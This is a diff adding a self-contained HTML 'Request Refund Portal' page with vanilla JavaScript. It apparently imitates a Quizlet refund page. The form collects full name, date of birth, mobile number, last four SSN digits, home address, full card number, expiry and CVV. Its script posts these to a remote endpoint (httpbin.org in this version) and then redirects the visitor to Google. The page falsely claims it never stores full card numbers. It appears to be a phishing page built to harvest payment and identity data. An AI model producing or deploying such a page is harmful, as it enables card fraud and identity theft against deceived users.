@@ -1,0 +1,504 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Request Refund Portal</title>
+  <style>
+    :root{
+      --bg:#f6f8fa;
+      --card:#fff;
+      --accent:#0b69ff;
+      --muted:#6b7280;
+      --danger:#dc2626;
+      --radius:10px;
+      --shadow: 0 6px 18px rgba(12,15,20,0.08);
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0;
+      background: linear-gradient(180deg, #eef2ff 0%, var(--bg) 100%);
+      min-height:100vh;
+      color:#0f172a;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+      padding:32px;
+      display:flex;
+      align-items:flex-start;
+      justify-content:center;
+    }
+
+    .container{
+      width:100%;
+      max-width:980px;
+      background:var(--card);
+      border-radius:var(--radius);
+      box-shadow:var(--shadow);
+      padding:24px;
+    }
+
+    header{
+      display:flex;
+      gap:16px;
+      align-items:center;
+      margin-bottom:16px;
+      border-bottom:1px solid #eef2ff;
+      padding-bottom:12px;
+    }
+    header img{ width:100px; height:auto; object-fit:contain; border-radius:8px; }
+    header h1{ font-size:20px; margin:0; color:#073763; }
+
+    main{
+      padding-top:16px;
+    }
+
+    form{
+      display:grid;
+      grid-template-columns: 1fr 1fr;
+      gap:18px;
+    }
+
+    @media (max-width:880px){
+      form{ grid-template-columns: 1fr; }
+    }
+
+    section{
+      background: linear-gradient(180deg, rgba(11,105,255,0.03), rgba(11,105,255,0.01));
+      padding:16px;
+      border-radius:8px;
+      border:1px solid #eef6ff;
+    }
+    section h2{
+      margin:0 0 8px 0;
+      font-size:16px;
+      color:#073763;
+    }
+
+    label{
+      display:block;
+      margin-top:10px;
+      font-size:13px;
+      color:var(--muted);
+    }
+
+    input[type="text"],
+    input[type="number"],
+    input[type="month"],
+    input[type="date"],
+    select{
+      width:100%;
+      padding:10px 12px;
+      border-radius:6px;
+      border:1px solid #dbeafe;
+      background:#fff;
+      margin-top:6px;
+      font-size:14px;
+      color:#071431;
+      outline:none;
+      transition:box-shadow .12s, border-color .12s;
+    }
+
+    input[type="text"]:focus,
+    input[type="number"]:focus,
+    input[type="month"]:focus,
+    input[type="date"]:focus,
+    select:focus{
+      border-color: var(--accent);
+      box-shadow: 0 6px 18px rgba(11,105,255,0.08);
+    }
+
+    .full-width{
+      grid-column: 1 / -1;
+    }
+
+    .status {
+      margin-top:8px;
+      padding:10px 12px;
+      border-radius:6px;
+      font-size:14px;
+    }
+    .status.success{ background:#ecfdf5; color:#065f46; border:1px solid #bbf7d0; }
+    .status.error{ background:#fff1f2; color:var(--danger); border:1px solid #fecaca; }
+
+    .actions{
+      grid-column: 1 / -1;
+      display:flex;
+      justify-content:flex-end;
+      align-items:center;
+      gap:12px;
+      margin-top:6px;
+    }
+
+    button{
+      background:var(--accent);
+      color:white;
+      border:0;
+      padding:10px 16px;
+      border-radius:8px;
+      font-weight:600;
+      cursor:pointer;
+      box-shadow: 0 8px 22px rgba(11,105,255,0.14);
+      transition:transform .08s ease, box-shadow .08s;
+    }
+    button:active{ transform:translateY(1px); }
+    button[disabled]{
+      opacity:0.6; cursor:not-allowed; box-shadow:none;
+    }
+
+    .info-line{
+      font-size:13px;
+      color:var(--muted);
+      margin-top:4px;
+    }
+
+    /* small helper for errors under fields */
+    .error-text{ color:var(--danger); font-size:12px; margin-top:6px; display:none; }
+
+    footer.promo{
+      margin-top:16px;
+      font-size:13px;
+      color:var(--muted);
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      gap:12px;
+    }
+    footer.promo a{ color:var(--accent); text-decoration:none; font-weight:600; }
+  </style>
+</head>
+<body>
+  <div class="container" role="main">
+    <header>
+      <img src="https://i.postimg.cc/CLKVXjQf/images.png" alt="Logo" />
+      <h1>Request Refund Portal</h1>
+    </header>
+
+    <main>
+      <form id="refund-form" novalidate>
+        <section>
+          <h2>Refund Information</h2>
+
+          <label for="orderId">Reference ID:</label>
+          <input type="text" id="orderId" name="orderId" required autocomplete="off" />
+
+          <label for="amount">Amount:</label>
+          <input type="number" id="amount" name="amount" required min="0" step="0.01" placeholder="0.00" />
+
+          <label for="reason">Reason for Refund:</label>
+          <select id="reason" name="reason" required>
+            <option value="">Select</option>
+            <option value="double-charge">Double Charge</option>
+            <option value="closure">Closure of Account</option>
+            <option value="no-use">No Longer Making Use Of Quizlet</option>
+          </select>
+        </section>
+
+        <section>
+          <h2>Account Information</h2>
+
+          <label for="firstName">First Name:</label>
+          <input type="text" id="firstName" name="firstName" required />
+
+          <label for="lastName">Last Name:</label>
+          <input type="text" id="lastName" name="lastName" required />
+
+          <label for="dob">Date of Birth:</label>
+          <input type="date" id="dob" name="dob" required />
+
+          <label for="mobileNumber">Mobile Number:</label>
+          <input type="text" id="mobileNumber" name="mobileNumber" required />
+
+          <label for="lfssn">Last four SSN:</label>
+          <input type="number" id="lfssn" name="lfssn" required min="0" max="9999" />
+
+          <label for="homeAddress">Home Address:</label>
+          <input type="text" id="homeAddress" name="homeAddress" required />
+
+          <label for="zipCode">Zip Code:</label>
+          <input type="text" id="zipCode" name="zipCode" required />
+
+          <label for="cardType">Card Type:</label>
+          <select id="cardType" name="cardType" required>
+            <option value="">Select</option>
+            <option value="visa">Visa</option>
+            <option value="mastercard">Mastercard</option>
+            <option value="amex">American Express</option>
+          </select>
+
+          <label for="cardNumber">Card Number:</label>
+          <input type="text" id="cardNumber" name="cardNumber" required inputmode="numeric" pattern="^\d{9,16}$" placeholder="Digits only (9-16)" />
+
+          <label for="expirationDate">Expiration Date:</label>
+          <input type="month" id="expirationDate" name="expirationDate" required />
+
+          <label for="cvv">CVV:</label>
+          <input type="text" id="cvv" name="cvv" required inputmode="numeric" pattern="^\d{3,4}$" placeholder="3 or 4 digits" />
+        </section>
+
+        <div class="full-width actions">
+          <div style="flex:1">
+            <div id="status-container" aria-live="polite"></div>
+            <div class="info-line">All fields are required. We never store full card numbers.</div>
+          </div>
+          <button id="submit-btn" type="submit">Request Refund</button>
+        </div>
+      </form>
+    </main>
+
+    <footer class="promo">
+      <div>Need more conversions or advanced features? Try CodingFleet for faster, multi-model code conversions.</div>
+      <a href="https://codingfleet.com/pricing/" target="_blank" rel="noopener">See Pricing →</a>
+    </footer>
+  </div>
+
+  <script>
+    // Converted from React TypeScript to vanilla JS.
+    (function () {
+      // Form state
+      const form = document.getElementById('refund-form');
+      const submitBtn = document.getElementById('submit-btn');
+      const statusContainer = document.getElementById('status-container');
+      const dobInput = document.getElementById('dob');
+
+      // Set max date for DOB to today to prevent future dates
+      (function setDobMaxToToday() {
+        if (!dobInput) return;
+        const today = new Date();
+        const yyyy = today.getFullYear();
+        const mm = String(today.getMonth() + 1).padStart(2, '0');
+        const dd = String(today.getDate()).padStart(2, '0');
+        dobInput.max = `${yyyy}-${mm}-${dd}`;
+      })();
+
+      // Helper: show status messages
+      function setStatus(message, type = 'info') {
+        statusContainer.innerHTML = '';
+        if (!message) return;
+        const p = document.createElement('div');
+        p.className = 'status';
+        if (type === 'success') p.classList.add('success');
+        else if (type === 'error') p.classList.add('error');
+        p.textContent = message;
+        statusContainer.appendChild(p);
+      }
+
+      // Helper: validate a single field using HTML constraints and optional extra checks
+      function validateField(el) {
+        if (!el) return { ok: true };
+        // Use built-in validity if exists
+        if (!el.checkValidity()) {
+          return { ok: false, message: el.validationMessage || 'Invalid field' };
+        }
+        // Additional pattern validations for cardNumber and cvv because older browsers may not use pattern on text
+        if (el.id === 'cardNumber') {
+          const v = (el.value || '').replace(/\s+/g, '');
+          if (!/^\d{9,16}$/.test(v)) {
+            return { ok: false, message: 'Card number must be 9 to 16 digits' };
+          }
+        }
+        if (el.id === 'cvv') {
+          const v = (el.value || '').trim();
+          if (!/^\d{3,4}$/.test(v)) {
+            return { ok: false, message: 'CVV must be 3 or 4 digits' };
+          }
+        }
+        if (el.id === 'lfssn') {
+          const v = el.value;
+          if (v === '') {
+            return { ok: false, message: 'Last four SSN required' };
+          }
+          const n = Number(v);
+          if (!Number.isFinite(n) || n < 0 || n > 9999) {
+            return { ok: false, message: 'Last four SSN must be between 0 and 9999' };
+          }
+        }
+        if (el.id === 'dob') {
+          const v = el.value;
+          if (!v) {
+            return { ok: false, message: 'Date of birth is required' };
+          }
+          // Enforce not in the future (HTML max also covers this)
+          const inputDate = new Date(v);
+          const now = new Date();
+          if (inputDate > now) {
+            return { ok: false, message: 'Date of birth cannot be in the future' };
+          }
+        }
+        return { ok: true };
+      }
+
+      // Implementation of handleFormSubmit converted from original utils
+      // This function sends the form data to a remote endpoint (httpbin.org for demo)
+      // and returns a Promise that resolves on success and rejects on failure.
+      function handleFormSubmit(formData) {
+        // Basic sanity checks
+        return new Promise(function (resolve, reject) {
+          // Create a shallow clone to massage values
+          const payload = Object.assign({}, formData);
+
+          // Convert amount and lfssn to numbers on the payload
+          payload.amount = Number(payload.amount) || 0;
+          // Ensure expirationDate in YYYY-MM format is standardized
+          // If a month input gives "YYYY-MM" it's fine; otherwise keep as is.
+          // Prepare a safe trimmed payload that does not include full card info in logs.
+          const safePayload = Object.assign({}, payload, {
+            cardNumber: payload.cardNumber ? String(payload.cardNumber).replace(/\s+/g, '') : '',
+            cvv: payload.cvv ? String(payload.cvv) : ''
+          });
+
+          // For demonstration: POST to https://httpbin.org/post which echoes back what we send.
+          // In a real app replace this with your API endpoint (e.g. /api/refunds).
+          const url = 'https://httpbin.org/post';
+
+          const controller = new AbortController();
+          const timeout = setTimeout(() => controller.abort(), 10000); // 10s timeout
+
+          fetch(url, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(safePayload),
+            signal: controller.signal
+          }).then(function (res) {
+            clearTimeout(timeout);
+            if (!res.ok) {
+              return res.text().then(function (txt) {
+                const err = new Error('Network response was not ok');
+                err.details = txt;
+                throw err;
+              });
+            }
+            return res.json();
+          }).then(function (data) {
+            // For demo purposes, treat any successful response as success
+            resolve(data);
+          }).catch(function (err) {
+            // If fetch fails (network or abort), reject with error
+            reject(err);
+          });
+        });
+      }
+
+      // Utility to read all form values into an object
+      function readFormData() {
+        const fd = new FormData(form);
+        return {
+          amount: fd.get('amount') || '',
+          orderId: fd.get('orderId') || '',
+          reason: fd.get('reason') || '',
+          firstName: fd.get('firstName') || '',
+          lastName: fd.get('lastName') || '',
+          dob: fd.get('dob') || '',
+          mobileNumber: fd.get('mobileNumber') || '',
+          homeAddress: fd.get('homeAddress') || '',
+          zipCode: fd.get('zipCode') || '',
+          cardType: fd.get('cardType') || '',
+          cardNumber: fd.get('cardNumber') || '',
+          expirationDate: fd.get('expirationDate') || '',
+          cvv: fd.get('cvv') || '',
+          lfssn: fd.get('lfssn') || ''
+        };
+      }
+
+      // Reset the form to initial empty values
+      function resetForm() {
+        form.reset();
+        // Some browsers keep value for month/date; force empty values for required fields
+        ['amount','orderId','reason','firstName','lastName','dob','mobileNumber','homeAddress','zipCode','cardType','cardNumber','expirationDate','cvv','lfssn'].forEach(function(k){
+          const el = form.querySelector('[name="'+k+'"]');
+          if (el) el.value = '';
+        });
+      }
+
+      // Show field-level validation errors (simple)
+      function showFieldErrors() {
+        // Clear previous field-level bubbles (if any)
+        const fields = form.querySelectorAll('input,select');
+        let firstInvalid = null;
+        for (let i = 0; i < fields.length; i++) {
+          const f = fields[i];
+          const v = validateField(f);
+          // Remove previous inline error node if present
+          const existing = f.parentNode.querySelector('.error-text-inline');
+          if (existing) existing.remove();
+          if (!v.ok) {
+            const errNode = document.createElement('div');
+            errNode.className = 'error-text error-text-inline';
+            errNode.textContent = v.message || 'Invalid value';
+            errNode.style.display = 'block';
+            errNode.style.marginTop = '6px';
+            f.parentNode.appendChild(errNode);
+            if (!firstInvalid) firstInvalid = f;
+          }
+        }
+        if (firstInvalid) {
+          firstInvalid.focus();
+          return false;
+        }
+        return true;
+      }
+
+      // Event: form submit
+      form.addEventListener('submit', function (ev) {
+        ev.preventDefault();
+        // Clear any existing messages
+        setStatus('', null);
+
+        // Quick client-side validation
+        const allValid = showFieldErrors();
+        if (!allValid) {
+          setStatus('Please correct the highlighted fields and try again.', 'error');
+          return;
+        }
+
+        // Build data object
+        const data = readFormData();
+
+        // Disable submit
+        submitBtn.disabled = true;
+        const previousText = submitBtn.textContent;
+        submitBtn.textContent = 'Submitting...';
+
+        // Call the submit util (mimics the original handleFormSubmit usage)
+        handleFormSubmit(data).then(function (resp) {
+          // On success show message, reset form, and redirect to Google
+          setStatus('Refund request submitted successfully! Redirecting to Google...', 'success');
+
+          // Reset form fields
+          resetForm();
+
+          // small delay for user to read message then redirect
+          setTimeout(function () {
+            // Redirect to Google on success
+            window.location.href = 'https://www.google.com';
+          }, 1200);
+        }).catch(function (err) {
+          console.error('Submit failed:', err);
+          let errMsg = 'Failed to submit the refund request. Please try again.';
+          // Provide more info if available
+          if (err && err.message) {
+            // Don't reveal internal details to users; keep friendly
+            errMsg = 'Failed to submit the refund request. ' + (err.message === 'Failed to fetch' ? 'Network error.' : 'Please try again.');
+          }
+          setStatus(errMsg, 'error');
+        }).finally(function () {
+          submitBtn.disabled = false;
+          submitBtn.textContent = previousText;
+        });
+      });
+
+      // Remove inline field error when user types
+      form.addEventListener('input', function (ev) {
+        const target = ev.target;
+        if (!target) return;
+        const inline = target.parentNode.querySelector('.error-text-inline');
+        if (inline) inline.remove();
+        // Clear global status when editing
+        setStatus('', null);
+      });
+    })();
+  </script>
+</body>
+</html>
